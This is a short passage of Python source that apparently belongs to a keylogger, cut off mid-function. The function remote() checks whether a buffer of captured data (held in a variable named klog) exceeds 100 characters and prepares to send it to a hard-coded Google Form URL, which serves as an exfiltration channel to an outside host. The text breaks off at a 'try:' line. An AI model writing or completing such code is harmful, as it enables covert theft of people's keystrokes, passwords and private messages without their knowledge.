...
def remote():
    global data
    if len(data)>100:
        url="https://docs.google.com/forms/d/e/1FAIpQLSfp_gixzD5tSCAOtJe_1RbI-Mjt9a90myiifL7qCx56voYQsg/formResponse" #Specify Google Form URL here
        klog={'entry.2038956421':data} #Specify the Field Name here
        try:
